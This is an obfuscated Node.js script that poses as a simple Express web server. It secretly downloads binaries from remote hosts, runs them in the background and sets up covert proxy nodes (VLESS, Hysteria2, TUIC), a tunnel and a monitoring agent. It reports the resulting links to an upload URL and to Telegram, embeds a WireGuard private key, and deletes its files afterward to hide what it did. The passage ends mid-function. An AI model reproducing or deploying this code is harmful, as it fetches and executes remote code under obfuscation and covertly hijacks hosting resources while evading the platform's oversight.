#!/usr/bin/env node

const _0xf0fbb6=_0x56f4;(function(_0x5d8181,_0x11c481){const _0x7db4ca=_0x56f4,_0x4b9eea=_0x5d8181();while(!![]){try{const _0x239f7a=-parseInt(_0x7db4ca(0xcd))/0x1+parseInt(_0x7db4ca(0x108))/0x2+-parseInt(_0x7db4ca(0x15d))/0x3*(parseInt(_0x7db4ca(0xfc))/0x4)+parseInt(_0x7db4ca(0x114))/0x5+-parseInt(_0x7db4ca(0x153))/0x6*(parseInt(_0x7db4ca(0x145))/0x7)+-parseInt(_0x7db4ca(0xb6))/0x8+-parseInt(_0x7db4ca(0x179))/0x9*(-parseInt(_0x7db4ca(0xc5))/0xa);if(_0x239f7a===_0x11c481)break;else _0x4b9eea['push'](_0x4b9eea['shift']());}catch(_0x69ac05){_0x4b9eea['push'](_0x4b9eea['shift']());}}}(_0x3fcd,0x95b1f));const express=require(_0xf0fbb6(0xfb)),app=express(),axios=require(_0xf0fbb6(0xa0)),os=require('os'),fs=require('fs'),path=require(_0xf0fbb6(0xda)),{promisify}=require('util'),exec=promisify(require(_0xf0fbb6(0x170))['exec']),{execSync}=require(_0xf0fbb6(0x170)),UPLOAD_URL=process[_0xf0fbb6(0x162)][_0xf0fbb6(0xd1)]||'',PROJECT_URL=process[_0xf0fbb6(0x162)][_0xf0fbb6(0xed)]||'',AUTO_ACCESS=process[_0xf0fbb6(0x162)]['AUTO_ACCESS']||![],FILE_PATH=process[_0xf0fbb6(0x162)][_0xf0fbb6(0xcf)]||_0xf0fbb6(0x13e),SUB_PATH=process[_0xf0fbb6(0x162)][_0xf0fbb6(0x14d)]||'leaflow',KAMAN=process[_0xf0fbb6(0x162)]['KAMAN']||_0xf0fbb6(0x157),YOUNGHERO_SERVER=process[_0xf0fbb6(0x162)][_0xf0fbb6(0xd2)]||_0xf0fbb6(0x16a),YOUNGHERO_PORT=process[_0xf0fbb6(0x162)][_0xf0fbb6(0x98)]||'',YOUNGHERO_KEY=process[_0xf0fbb6(0x162)]['YOUNGHERO_KEY']||_0xf0fbb6(0xab),SUIDAO_DOMAIN=process[_0xf0fbb6(0x162)][_0xf0fbb6(0xbf)]||'leaflow.kaixa.xx.kg',SUIDAO_AUTH=process[_0xf0fbb6(0x162)][_0xf0fbb6(0x12f)]||_0xf0fbb6(0x156),SUIDAO_PORT=process[_0xf0fbb6(0x162)][_0xf0fbb6(0xf8)]||0x1f41,TUIC_PORT=process['env'][_0xf0fbb6(0x10a)]||_0xf0fbb6(0xd6),HY2_PORT=process[_0xf0fbb6(0x162)][_0xf0fbb6(0x14c)]||_0xf0fbb6(0x169),REALITY_PORT=process[_0xf0fbb6(0x162)][_0xf0fbb6(0x171)]||_0xf0fbb6(0xa8),CFIP=process['env']['CFIP']||_0xf0fbb6(0xf0),CFPORT=process[_0xf0fbb6(0x162)][_0xf0fbb6(0xc4)]||0x1bb,PORT=process[_0xf0fbb6(0x162)][_0xf0fbb6(0xf7)]||0xbb8,NAME=process[_0xf0fbb6(0x162)]['NAME']||'Leaflow',CHAT_ID=process[_0xf0fbb6(0x162)][_0xf0fbb6(0x141)]||'',BOT_TOKEN=process[_0xf0fbb6(0x162)][_0xf0fbb6(0x109)]||'';require(_0xf0fbb6(0x10c))[_0xf0fbb6(0x132)]();!fs['existsSync'](FILE_PATH)?(fs[_0xf0fbb6(0xe6)](FILE_PATH),console[_0xf0fbb6(0xe5)](FILE_PATH+_0xf0fbb6(0xd5))):console[_0xf0fbb6(0xe5)](FILE_PATH+_0xf0fbb6(0x152));let privateKey='',publicKey='',npmPath=path[_0xf0fbb6(0x9e)](FILE_PATH,_0xf0fbb6(0x15b)),phpPath=path[_0xf0fbb6(0x9e)](FILE_PATH,_0xf0fbb6(0xec)),webPath=path['join'](FILE_PATH,'web'),botPath=path[_0xf0fbb6(0x9e)](FILE_PATH,_0xf0fbb6(0x15f)),subPath=path[_0xf0fbb6(0x9e)](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,'list.txt'),bootLogPath=path[_0xf0fbb6(0x9e)](FILE_PATH,_0xf0fbb6(0x14e)),configPath=path[_0xf0fbb6(0x9e)](FILE_PATH,'config.json');function deleteNodes(){const _0x5b684f=_0xf0fbb6;try{if(!UPLOAD_URL)return;const _0x409b41=path[_0x5b684f(0x9e)](FILE_PATH,'sub.txt');if(!fs[_0x5b684f(0x96)](_0x409b41))return;let _0x33d512;try{_0x33d512=fs[_0x5b684f(0x143)](_0x409b41,_0x5b684f(0xce));}catch{return null;}const _0xd331d0=Buffer[_0x5b684f(0xba)](_0x33d512,_0x5b684f(0x158))[_0x5b684f(0xb0)](_0x5b684f(0xce)),_0x2260e8=_0xd331d0['split']('\x0a')[_0x5b684f(0x119)](_0x27e73e=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5b684f(0x142)](_0x27e73e));if(_0x2260e8[_0x5b684f(0x100)]===0x0)return;return axios[_0x5b684f(0x129)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x5b684f(0x112)]({'nodes':_0x2260e8}),{'headers':{'Content-Type':_0x5b684f(0xdd)}})[_0x5b684f(0xd3)](_0x283394=>{return null;});}catch(_0x478d93){return null;}}function isValidPort(_0x4e748c){const _0x10d1a0=_0xf0fbb6;try{if(_0x4e748c===null||_0x4e748c===undefined||_0x4e748c==='')return![];if(typeof _0x4e748c===_0x10d1a0(0x12b)&&_0x4e748c[_0x10d1a0(0x115)]()==='')return![];const _0xc7a8ef=parseInt(_0x4e748c);if(isNaN(_0xc7a8ef))return![];if(_0xc7a8ef<0x1||_0xc7a8ef>0xffff)return![];return!![];}catch(_0x4e1ffa){return![];}}const pathsToDelete=[_0xf0fbb6(0x139),_0xf0fbb6(0x15f),_0xf0fbb6(0x15b),_0xf0fbb6(0x14e),_0xf0fbb6(0xd0)];function cleanupOldFiles(){const _0x1039c6=_0xf0fbb6;pathsToDelete[_0x1039c6(0xe2)](_0x23e219=>{const _0x169bf5=_0x1039c6,_0x1f7c10=path[_0x169bf5(0x9e)](FILE_PATH,_0x23e219);fs[_0x169bf5(0x130)](_0x1f7c10,()=>{});});}app['get']('/',function(_0x4ab34c,_0x2f3e48){const _0x50d9=_0xf0fbb6,_0x348f15=path[_0x50d9(0x9e)](__dirname,_0x50d9(0xfa));fs[_0x50d9(0x96)](_0x348f15)?_0x2f3e48[_0x50d9(0x124)](_0x348f15):_0x2f3e48[_0x50d9(0x172)](_0x50d9(0xa3));});function getSystemArchitecture(){const _0x544ab2=_0xf0fbb6,_0x3bce05=os[_0x544ab2(0xa1)]();return _0x3bce05===_0x544ab2(0x123)||_0x3bce05==='arm64'||_0x3bce05===_0x544ab2(0x93)?_0x544ab2(0x123):_0x544ab2(0x166);}function downloadFile(_0x131b19,_0x51f219,_0x4f2214){const _0x55e386=_0xf0fbb6,_0x4a1790=path[_0x55e386(0x9e)](FILE_PATH,_0x131b19),_0x154811=fs[_0x55e386(0xbb)](_0x4a1790);axios({'method':_0x55e386(0x11a),'url':_0x51f219,'responseType':_0x55e386(0x101)})[_0x55e386(0x14a)](_0x468568=>{const _0x19995d=_0x55e386;_0x468568[_0x19995d(0x13d)][_0x19995d(0x14b)](_0x154811),_0x154811['on'](_0x19995d(0x16e),()=>{const _0xfa5cc4=_0x19995d;_0x154811[_0xfa5cc4(0x165)](),console[_0xfa5cc4(0xe5)]('Download\x20'+_0x131b19+'\x20successfully'),_0x4f2214(null,_0x131b19);}),_0x154811['on'](_0x19995d(0xe4),_0x101103=>{const _0x117893=_0x19995d;fs[_0x117893(0x130)](_0x4a1790,()=>{});const _0x107b60='Download\x20'+_0x131b19+_0x117893(0x105)+_0x101103['message'];console[_0x117893(0xe4)](_0x107b60),_0x4f2214(_0x107b60);});})[_0x55e386(0xd3)](_0x5421f5=>{const _0x505bf7=_0x55e386,_0x57791a=_0x505bf7(0x163)+_0x131b19+_0x505bf7(0x105)+_0x5421f5[_0x505bf7(0x15a)];console[_0x505bf7(0xe4)](_0x57791a),_0x4f2214(_0x57791a);});}async function downloadFilesAndRun(){const _0x4d01ef=_0xf0fbb6,_0x1b77ea=getSystemArchitecture(),_0x7aa3ab=getFilesForArchitecture(_0x1b77ea);if(_0x7aa3ab['length']===0x0){console[_0x4d01ef(0xe5)](_0x4d01ef(0x92));return;}const _0x337601=_0x7aa3ab[_0x4d01ef(0x180)](_0x19bfeb=>{return new Promise((_0x54b3e5,_0x23f1b0)=>{const _0x1e3489=_0x56f4;downloadFile(_0x19bfeb[_0x1e3489(0x140)],_0x19bfeb[_0x1e3489(0x103)],(_0x194a57,_0x3e0d3a)=>{_0x194a57?_0x23f1b0(_0x194a57):_0x54b3e5(_0x3e0d3a);});});});try{await Promise[_0x4d01ef(0xf1)](_0x337601);}catch(_0xca4611){console[_0x4d01ef(0xe4)]('Error\x20downloading\x20files:',_0xca4611);return;}function _0x195d63(_0x3a1ba5){const _0x5048f1=_0x4d01ef,_0x33accc=0x1fd;_0x3a1ba5[_0x5048f1(0xe2)](_0x5cf13a=>{const _0x97cc84=_0x5048f1,_0x5390ba=path[_0x97cc84(0x9e)](FILE_PATH,_0x5cf13a);fs['existsSync'](_0x5390ba)&&fs['chmod'](_0x5390ba,_0x33accc,_0x111542=>{const _0x11ffc9=_0x97cc84;_0x111542?console['error'](_0x11ffc9(0xeb)+_0x5390ba+':\x20'+_0x111542):console[_0x11ffc9(0xe5)]('Empowerment\x20success\x20for\x20'+_0x5390ba+':\x20'+_0x33accc[_0x11ffc9(0xb0)](0x8));});});}const _0x102b80=YOUNGHERO_PORT?[_0x4d01ef(0x9a),'./web',_0x4d01ef(0xb8)]:['./php',_0x4d01ef(0xde),_0x4d01ef(0xb8)];_0x195d63(_0x102b80);const _0x239059=YOUNGHERO_SERVER['includes'](':')?YOUNGHERO_SERVER[_0x4d01ef(0xa2)](':')[_0x4d01ef(0xd9)]():'',_0x4768cb=new Set(['443',_0x4d01ef(0x159),_0x4d01ef(0x11d),'2087',_0x4d01ef(0xc0),'2053']),_0x4de501=_0x4768cb[_0x4d01ef(0x11b)](_0x239059)?_0x4d01ef(0xa6):_0x4d01ef(0xb2);if(YOUNGHERO_SERVER&&YOUNGHERO_KEY){if(!YOUNGHERO_PORT){const _0x2adb97='\x0aclient_secret:\x20'+YOUNGHERO_KEY+_0x4d01ef(0xc7)+YOUNGHERO_SERVER+_0x4d01ef(0x122)+_0x4de501+_0x4d01ef(0x17b)+KAMAN;fs['writeFileSync'](path['join'](FILE_PATH,_0x4d01ef(0xdb)),_0x2adb97);}}const _0x295152=path[_0x4d01ef(0x9e)](FILE_PATH,_0x4d01ef(0x99));if(fs[_0x4d01ef(0x96)](_0x295152)){const _0x11cb34=fs[_0x4d01ef(0x143)](_0x295152,_0x4d01ef(0x147)),_0x35c7e5=_0x11cb34[_0x4d01ef(0x175)](/PrivateKey:\s*(.*)/),_0xfa3e71=_0x11cb34[_0x4d01ef(0x175)](/PublicKey:\s*(.*)/);privateKey=_0x35c7e5?_0x35c7e5[0x1]:'',publicKey=_0xfa3e71?_0xfa3e71[0x1]:'';if(!privateKey||!publicKey){console[_0x4d01ef(0xe4)](_0x4d01ef(0xf4));return;}console[_0x4d01ef(0xe5)](_0x4d01ef(0x146),privateKey),console['log']('Public\x20Key:',publicKey),_0x11288e();}else exec(path['join'](FILE_PATH,'web')+_0x4d01ef(0x135),async(_0x695c66,_0x4db844,_0x5bfe5e)=>{const _0x368d54=_0x4d01ef;if(_0x695c66){console['error'](_0x368d54(0x154)+_0x695c66[_0x368d54(0x15a)]);return;}const _0x3a5abf=_0x4db844[_0x368d54(0x175)](/PrivateKey:\s*(.*)/),_0x4fe5be=_0x4db844[_0x368d54(0x175)](/PublicKey:\s*(.*)/);privateKey=_0x3a5abf?_0x3a5abf[0x1]:'',publicKey=_0x4fe5be?_0x4fe5be[0x1]:'';if(!privateKey||!publicKey){console[_0x368d54(0xe4)](_0x368d54(0x11c));return;}fs[_0x368d54(0xea)](_0x295152,_0x368d54(0xd8)+privateKey+_0x368d54(0xfe)+publicKey+'\x0a',_0x368d54(0x147)),console[_0x368d54(0xe5)]('Private\x20Key:',privateKey),console['log'](_0x368d54(0x12d),publicKey),_0x11288e();});function _0x11288e(){const _0x29c34d=_0x4d01ef;exec(_0x29c34d(0x177),(_0x1f2a61,_0x3f8f18,_0x4817c3)=>{const _0x30ad78=_0x29c34d;if(_0x1f2a61){console[_0x30ad78(0xe4)](_0x30ad78(0xd4)+_0x1f2a61[_0x30ad78(0x15a)]);return;}exec(_0x30ad78(0x10d),async(_0x11b384,_0x431321,_0x153b17)=>{const _0x4b4c53=_0x30ad78;if(_0x11b384){console[_0x4b4c53(0xe4)]('Error\x20generating\x20cert.pem:\x20'+_0x11b384['message']);return;}if(!privateKey||!publicKey){console[_0x4b4c53(0xe4)](_0x4b4c53(0x178));return;}const _0x4ca693={'log':{'disabled':!![],'level':'info','timestamp':!![]},'dns':{'servers':[{'address':_0x4b4c53(0x11f),'address_resolver':_0x4b4c53(0x136)},{'tag':_0x4b4c53(0x136),'address':'local'}]},'inbounds':[{'tag':_0x4b4c53(0x17f),'type':_0x4b4c53(0xf5),'listen':'::','listen_port':SUIDAO_PORT,'users':[{'uuid':KAMAN}],'transport':{'type':'ws','path':_0x4b4c53(0x16d),'early_data_header_name':_0x4b4c53(0x118)}}],'outbounds':[{'type':_0x4b4c53(0x151),'tag':_0x4b4c53(0x151)},{'type':'block','tag':'block'},{'type':'wireguard','tag':'wireguard-out','server':_0x4b4c53(0x102),'server_port':0x968,'local_address':[_0x4b4c53(0x155),_0x4b4c53(0x111)],'private_key':'eAx8o6MJrH4KE7ivPFFCa4qvYw5nJsYHCBQXPApQX1A=','peer_public_key':_0x4b4c53(0xb1),'reserved':[0x52,0x5a,0x33],'mtu':0x58c}],'route':{'rule_set':[{'tag':_0x4b4c53(0x13f),'type':_0x4b4c53(0xcc),'format':'binary','url':_0x4b4c53(0x8d),'download_detour':'direct'},{'tag':_0x4b4c53(0xf6),'type':_0x4b4c53(0xcc),'format':_0x4b4c53(0x110),'url':_0x4b4c53(0xae),'download_detour':_0x4b4c53(0x151)}],'rules':[{'rule_set':[_0x4b4c53(0xf6),_0x4b4c53(0x13f)],'outbound':'wireguard-out'}],'final':'direct'}};try{isValidPort(REALITY_PORT)&&_0x4ca693[_0x4b4c53(0xd7)]['push']({'tag':_0x4b4c53(0xc8),'type':'vless','listen':'::','listen_port':parseInt(REALITY_PORT),'users':[{'uuid':KAMAN,'flow':_0x4b4c53(0xef)}],'tls':{'enabled':!![],'server_name':'www.iij.ad.jp','reality':{'enabled':!![],'handshake':{'server':'www.iij.ad.jp','server_port':0x1bb},'private_key':privateKey,'short_id':['']}}});}catch(_0x257b52){}try{isValidPort(HY2_PORT)&&_0x4ca693[_0x4b4c53(0xd7)][_0x4b4c53(0x131)]({'tag':_0x4b4c53(0x167),'type':_0x4b4c53(0x15c),'listen':'::','listen_port':parseInt(HY2_PORT),'users':[{'password':KAMAN}],'masquerade':_0x4b4c53(0xb5),'tls':{'enabled':!![],'alpn':['h3'],'certificate_path':_0x4b4c53(0x14f),'key_path':_0x4b4c53(0x134)}});}catch(_0x358f60){}try{isValidPort(TUIC_PORT)&&_0x4ca693[_0x4b4c53(0xd7)][_0x4b4c53(0x131)]({'tag':_0x4b4c53(0x8e),'type':_0x4b4c53(0x13a),'listen':'::','listen_port':parseInt(TUIC_PORT),'users':[{'uuid':KAMAN}],'congestion_control':_0x4b4c53(0xe8),'tls':{'enabled':!![],'alpn':['h3'],'certificate_path':'cert.pem','key_path':_0x4b4c53(0x134)}});}catch(_0x465c50){}try{let _0x4589e8='',_0x4b9e0f=![];try{_0x4589e8=execSync(_0x4b4c53(0xad),{'encoding':'utf8'})['trim'](),_0x4b9e0f=_0x4589e8===_0x4b4c53(0x125);}catch(_0x2d8a6c){_0x2d8a6c[_0x4b4c53(0x17c)]&&_0x2d8a6c[_0x4b4c53(0x17c)][0x1]?(_0x4589e8=_0x2d8a6c['output'][0x1][_0x4b4c53(0xb0)]()['trim'](),_0x4b9e0f=_0x4589e8==='200'):(_0x4589e8='000',_0x4b9e0f=![]);}if(!_0x4b9e0f){console[_0x4b4c53(0xe5)]('YouTube\x20cannot\x20be\x20accessed,\x20adding\x20outbound\x20rules...');!_0x4ca693[_0x4b4c53(0x133)]&&(_0x4ca693['route']={});!_0x4ca693[_0x4b4c53(0x133)][_0x4b4c53(0x10f)]&&(_0x4ca693[_0x4b4c53(0x133)][_0x4b4c53(0x10f)]=[]);!_0x4ca693['route'][_0x4b4c53(0x138)]&&(_0x4ca693[_0x4b4c53(0x133)][_0x4b4c53(0x138)]=[]);const _0x20b981=_0x4ca693[_0x4b4c53(0x133)][_0x4b4c53(0x10f)]['find'](_0x4d14c9=>_0x4d14c9[_0x4b4c53(0xe3)]===_0x4b4c53(0x116));!_0x20b981&&(_0x4ca693[_0x4b4c53(0x133)][_0x4b4c53(0x10f)][_0x4b4c53(0x131)]({'tag':'youtube','type':'remote','format':_0x4b4c53(0x110),'url':_0x4b4c53(0x97),'download_detour':_0x4b4c53(0x151)}),console[_0x4b4c53(0xe5)]('已添加YouTube规则集'));let _0xb8e009=_0x4ca693[_0x4b4c53(0x133)][_0x4b4c53(0x138)]['find'](_0x514af7=>_0x514af7[_0x4b4c53(0x127)]===_0x4b4c53(0x16b));!_0xb8e009?(_0xb8e009={'rule_set':[_0x4b4c53(0xf6),'netflix',_0x4b4c53(0x116)],'outbound':'wireguard-out'},_0x4ca693[_0x4b4c53(0x133)]['rules'][_0x4b4c53(0x131)](_0xb8e009)):!_0xb8e009[_0x4b4c53(0x10f)][_0x4b4c53(0x173)]('youtube')&&_0xb8e009['rule_set']['push'](_0x4b4c53(0x116)),console[_0x4b4c53(0xe5)]('Add\x20YouTube\x20outbound\x20rule');}else{}}catch(_0x4effb5){console[_0x4b4c53(0xe4)](_0x4b4c53(0x150),_0x4effb5);}fs[_0x4b4c53(0xea)](path[_0x4b4c53(0x9e)](FILE_PATH,'config.json'),JSON[_0x4b4c53(0x112)](_0x4ca693,null,0x2));let _0x226e60='';if(YOUNGHERO_SERVER&&YOUNGHERO_PORT&&YOUNGHERO_KEY){const _0x101c7b=[_0x4b4c53(0xcb),_0x4b4c53(0x159),_0x4b4c53(0x11d),_0x4b4c53(0x10b),_0x4b4c53(0xc0),_0x4b4c53(0xb9)];_0x101c7b[_0x4b4c53(0x173)](YOUNGHERO_PORT)?_0x226e60=_0x4b4c53(0xac):_0x226e60='';const _0x246730=_0x4b4c53(0x8f)+path[_0x4b4c53(0x9e)](FILE_PATH,_0x4b4c53(0x15b))+_0x4b4c53(0x8c)+YOUNGHERO_SERVER+':'+YOUNGHERO_PORT+_0x4b4c53(0x117)+YOUNGHERO_KEY+'\x20'+_0x226e60+'\x20>/dev/null\x202>&1\x20&';try{await execPromise(_0x246730),console[_0x4b4c53(0xe5)](_0x4b4c53(0x15e)),await new Promise(_0x1cd086=>setTimeout(_0x1cd086,0x3e8));}catch(_0x547a58){console['error'](_0x4b4c53(0xb3)+_0x547a58);}}else{if(YOUNGHERO_SERVER&&YOUNGHERO_KEY){const _0x2c32a4=_0x4b4c53(0x8f)+FILE_PATH+_0x4b4c53(0x9c)+FILE_PATH+_0x4b4c53(0xc9);try{await exec(_0x2c32a4),console['log']('php\x20is\x20running'),await new Promise(_0x5de9d5=>setTimeout(_0x5de9d5,0x3e8));}catch(_0x291d67){console['error'](_0x4b4c53(0x91)+_0x291d67);}}else console[_0x4b4c53(0xe5)](_0x4b4c53(0x12c));}const _0x39dcb1='nohup\x20'+path[_0x4b4c53(0x9e)](FILE_PATH,'web')+_0x4b4c53(0x16c)+path[_0x4b4c53(0x9e)](FILE_PATH,_0x4b4c53(0x104))+_0x4b4c53(0xbd);try{await execPromise(_0x39dcb1),console[_0x4b4c53(0xe5)](_0x4b4c53(0xf9)),await new Promise(_0xb617e7=>setTimeout(_0xb617e7,0x3e8));}catch(_0x2efb11){console[_0x4b4c53(0xe4)](_0x4b4c53(0x95)+_0x2efb11);}if(fs[_0x4b4c53(0x96)](path[_0x4b4c53(0x9e)](FILE_PATH,_0x4b4c53(0x15f)))){let _0x29366a;if(SUIDAO_AUTH[_0x4b4c53(0x175)](/^[A-Z0-9a-z=]{120,250}$/))_0x29366a=_0x4b4c53(0x120)+SUIDAO_AUTH;else SUIDAO_AUTH[_0x4b4c53(0x175)](/TunnelSecret/)?_0x29366a='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+path[_0x4b4c53(0x9e)](FILE_PATH,_0x4b4c53(0x94))+'\x20run':_0x29366a=_0x4b4c53(0xf3)+path['join'](FILE_PATH,_0x4b4c53(0x14e))+_0x4b4c53(0xfd)+SUIDAO_PORT;try{await execPromise(_0x4b4c53(0x8f)+path[_0x4b4c53(0x9e)](FILE_PATH,_0x4b4c53(0x15f))+'\x20'+_0x29366a+_0x4b4c53(0xbd)),console[_0x4b4c53(0xe5)](_0x4b4c53(0xe1)),await new Promise(_0x1cd306=>setTimeout(_0x1cd306,0x7d0));}catch(_0x2361d2){console[_0x4b4c53(0xe4)](_0x4b4c53(0x168)+_0x2361d2);}}await new Promise(_0x7e1b01=>setTimeout(_0x7e1b01,0x1388)),await extractDomains();});});}}function execPromise(_0x27b6f2){return new Promise((_0x449316,_0x5d3643)=>{exec(_0x27b6f2,(_0x168a60,_0x5d48b0,_0x24f271)=>{_0x168a60?_0x5d3643(_0x168a60):_0x449316(_0x5d48b0||_0x24f271);});});}function getFilesForArchitecture(_0x5e5bf3){const _0x3dc688=_0xf0fbb6;let _0x40cb11;_0x5e5bf3==='arm'?_0x40cb11=[{'fileName':_0x3dc688(0x139),'fileUrl':_0x3dc688(0xe7)},{'fileName':_0x3dc688(0x15f),'fileUrl':'https://arm64.ssss.nyc.mn/2go'}]:_0x40cb11=[{'fileName':_0x3dc688(0x139),'fileUrl':_0x3dc688(0x17a)},{'fileName':_0x3dc688(0x15f),'fileUrl':'https://amd64.ssss.nyc.mn/2go'}];if(YOUNGHERO_SERVER&&YOUNGHERO_KEY){if(YOUNGHERO_PORT){const _0x477ab1=_0x5e5bf3===_0x3dc688(0x123)?_0x3dc688(0xff):'https://amd64.ssss.nyc.mn/agent';_0x40cb11[_0x3dc688(0xca)]({'fileName':_0x3dc688(0x15b),'fileUrl':_0x477ab1});}else{const _0x21eb87=_0x5e5bf3==='arm'?_0x3dc688(0x149):_0x3dc688(0x13b);_0x40cb11[_0x3dc688(0xca)]({'fileName':_0x3dc688(0xec),'fileUrl':_0x21eb87});}}return _0x40cb11;}function suidaoType(){const _0x1d267c=_0xf0fbb6;if(!SUIDAO_AUTH||!SUIDAO_DOMAIN){console[_0x1d267c(0xe5)](_0x1d267c(0x174));return;}if(SUIDAO_AUTH['includes'](_0x1d267c(0xa5))){fs[_0x1d267c(0xea)](path[_0x1d267c(0x9e)](FILE_PATH,_0x1d267c(0xdc)),SUIDAO_AUTH);const _0x3c2bb3='\x0a\x20\x20tunnel:\x20'+SUIDAO_AUTH[_0x1d267c(0xa2)]('\x22')[0xb]+_0x1d267c(0x113)+path[_0x1d267c(0x9e)](FILE_PATH,_0x1d267c(0xdc))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+SUIDAO_DOMAIN+_0x1d267c(0x12e)+SUIDAO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs['writeFileSync'](path[_0x1d267c(0x9e)](FILE_PATH,_0x1d267c(0x94)),_0x3c2bb3);}else console[_0x1d267c(0xe5)](_0x1d267c(0x9b));}suidaoType();async function extractDomains(){const _0x2f67be=_0xf0fbb6;let _0x289f30;if(SUIDAO_AUTH&&SUIDAO_DOMAIN)_0x289f30=SUIDAO_DOMAIN,console[_0x2f67be(0xe5)](_0x2f67be(0xc6),_0x289f30),await _0x12d4cf(_0x289f30);else try{const _0x1a8b18=fs['readFileSync'](path[_0x2f67be(0x9e)](FILE_PATH,_0x2f67be(0x14e)),_0x2f67be(0xce)),_0x4250c1=_0x1a8b18['split']('\x0a'),_0x62bef4=[];_0x4250c1[_0x2f67be(0xe2)](_0x3e2be5=>{const _0x2b7e8f=_0x2f67be,_0x254208=_0x3e2be5[_0x2b7e8f(0x175)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x254208){const _0xd6e5b3=_0x254208[0x1];_0x62bef4[_0x2b7e8f(0x131)](_0xd6e5b3);}});if(_0x62bef4[_0x2f67be(0x100)]>0x0)_0x289f30=_0x62bef4[0x0],console['log'](_0x2f67be(0x17e),_0x289f30),await _0x12d4cf(_0x289f30);else{console['log']('SuidaoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20SuidaoDomain'),fs['unlinkSync'](path['join'](FILE_PATH,_0x2f67be(0x14e)));async function _0x90cdc5(){const _0x546e23=_0x2f67be;try{await exec(_0x546e23(0xc1));}catch(_0x4dbddc){return null;}}_0x90cdc5(),await new Promise(_0x2d98ec=>setTimeout(_0x2d98ec,0x3e8));const _0x344e10=_0x2f67be(0xf3)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+SUIDAO_PORT;try{await exec('nohup\x20'+path[_0x2f67be(0x9e)](FILE_PATH,'bot')+'\x20'+_0x344e10+_0x2f67be(0xbd)),console[_0x2f67be(0xe5)](_0x2f67be(0x10e)),await new Promise(_0x58584d=>setTimeout(_0x58584d,0x1770)),await extractDomains();}catch(_0x13364a){console[_0x2f67be(0xe4)](_0x2f67be(0x168)+_0x13364a);}}}catch(_0x24eaad){console[_0x2f67be(0xe4)](_0x2f67be(0x90),_0x24eaad);}async function _0x12d4cf(_0x31cae3){const _0x5713f2=_0x2f67be;let _0x514e04='';try{_0x514e04=execSync(_0x5713f2(0xa7))[_0x5713f2(0xb0)]()[_0x5713f2(0x115)]();}catch(_0x4d3214){try{_0x514e04='['+execSync('curl\x20-s\x20--max-time\x201\x20ipv6.ip.sb')[_0x5713f2(0xb0)]()[_0x5713f2(0x115)]()+']';}catch(_0x2fc54c){console[_0x5713f2(0xe4)](_0x5713f2(0x9f),_0x2fc54c[_0x5713f2(0x15a)]);}}const _0x225134=execSync(_0x5713f2(0x137),{'encoding':_0x5713f2(0xce)}),_0x9bc553=_0x225134['trim']();return new Promise(_0x3d05f3=>{setTimeout(()=>{const _0x5d6c9f=_0x56f4,_0x33af30=_0x5d6c9f(0x11e)+Buffer[_0x5d6c9f(0xba)](JSON['stringify']({'v':'2','ps':NAME+'-'+_0x9bc553,'add':CFIP,'port':CFPORT,'id':KAMAN,'aid':'0','scy':_0x5d6c9f(0xaa),'net':'ws','type':_0x5d6c9f(0xaa),'host':_0x31cae3,'path':_0x5d6c9f(0xa4),'tls':'tls','sni':_0x31cae3,'alpn':''}))['toString'](_0x5d6c9f(0x158));let _0x1dfaae=_0x33af30;if(isValidPort(TUIC_PORT)){const _0x2669bc='\x0atuic://'+KAMAN+':@'+_0x514e04+':'+TUIC_PORT+_0x5d6c9f(0x161)+NAME+'-'+_0x9bc553;_0x1dfaae+=_0x2669bc;}if(isValidPort(HY2_PORT)){const _0x440f19='\x0ahysteria2://'+KAMAN+'@'+_0x514e04+':'+HY2_PORT+_0x5d6c9f(0xaf)+NAME+'-'+_0x9bc553;_0x1dfaae+=_0x440f19;}if(isValidPort(REALITY_PORT)){const _0x5793a7='\x0avless://'+KAMAN+'@'+_0x514e04+':'+REALITY_PORT+_0x5d6c9f(0x176)+publicKey+_0x5d6c9f(0xa9)+NAME+'-'+_0x9bc553;_0x1dfaae+=_0x5793a7;}console[_0x5d6c9f(0xe5)](Buffer[_0x5d6c9f(0xba)](_0x1dfaae)[_0x5d6c9f(0xb0)](_0x5d6c9f(0x158))),fs['writeFileSync'](subPath,Buffer[_0x5d6c9f(0xba)](_0x1dfaae)[_0x5d6c9f(0xb0)](_0x5d6c9f(0x158))),fs['writeFileSync'](listPath,_0x1dfaae,_0x5d6c9f(0x147)),console[_0x5d6c9f(0xe5)](FILE_PATH+_0x5d6c9f(0x160)),sendTelegram(),uplodNodes(),app[_0x5d6c9f(0x11a)]('/'+SUB_PATH,(_0xa9cad9,_0x3d0fb0)=>{const _0x3c0fd3=_0x5d6c9f,_0x105ba8=Buffer['from'](_0x1dfaae)[_0x3c0fd3(0xb0)](_0x3c0fd3(0x158));_0x3d0fb0[_0x3c0fd3(0x144)]('Content-Type',_0x3c0fd3(0xc3)),_0x3d0fb0['send'](_0x105ba8);}),_0x3d05f3(_0x1dfaae);},0x7d0);});}}function cleanFiles(){setTimeout(()=>{const _0x1a03dd=_0x56f4,_0x3ca8c6=[bootLogPath,configPath,listPath,webPath,botPath,phpPath,npmPath];if(YOUNGHERO_PORT)_0x3ca8c6['push'](npmPath);else YOUNGHERO_SERVER&&YOUNGHERO_KEY&&_0x3ca8c6[_0x1a03dd(0x131)](phpPath);exec(_0x1a03dd(0x107)+_0x3ca8c6[_0x1a03dd(0x9e)]('\x20')+_0x1a03dd(0x121),_0x478f51=>{const _0x3cd4df=_0x1a03dd;console[_0x3cd4df(0xf2)](),console[_0x3cd4df(0xe5)](_0x3cd4df(0xc2)),console[_0x3cd4df(0xe5)](_0x3cd4df(0x12a));});},0x15f90);}function _0x3fcd(){const 